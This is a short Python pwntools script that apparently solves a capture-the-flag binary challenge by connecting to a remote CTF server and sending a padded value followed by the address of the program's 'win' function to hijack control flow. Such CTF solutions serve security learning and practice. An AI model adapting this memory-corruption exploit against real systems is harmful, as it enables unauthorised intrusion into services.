from pwn import *

# p = process('./chall')
p = remote('chall.live.ctf.tsg.ne.jp', 30007)
e = ELF('./chall')

p.send(b'32'.ljust(8, b'\0')+p64(e.symbols['win']))
p.interactive()
